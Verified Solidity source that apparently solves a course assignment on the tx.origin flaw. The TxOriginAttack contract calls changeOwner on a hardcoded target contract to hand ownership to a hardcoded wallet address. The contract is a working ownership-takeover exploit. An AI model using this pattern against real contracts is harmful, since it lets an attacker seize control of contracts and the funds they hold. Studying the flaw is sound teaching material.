/**
 *Submitted for verification at Etherscan.io on 2022-09-07
*/

// File: contracts/TxOriginAssigmnentInterface.sol

pragma solidity >=0.8.0 <0.9.0;

interface TxOriginAssigmnentInterface {
  function changeOwner ( address _owner ) external;
  function owner (  ) external view returns ( address );
}

// File: contracts/TxOriginAttack.sol

pragma solidity >= 0.8.0 < 0.9.0;


contract TxOriginAttack{
    address TxOriginAssigmnentAddress = 0xe41a71605483c477c4fAfAd62E54b6beec9eC207;
    address metamaskAccount = 0x388eEe10A1EB3Ce516A858A955c5D131BA26E9A1;

    function callContract() public {
        TxOriginAssigmnentInterface(TxOriginAssigmnentAddress).changeOwner(0x388eEe10A1EB3Ce516A858A955c5D131BA26E9A1);
    }

}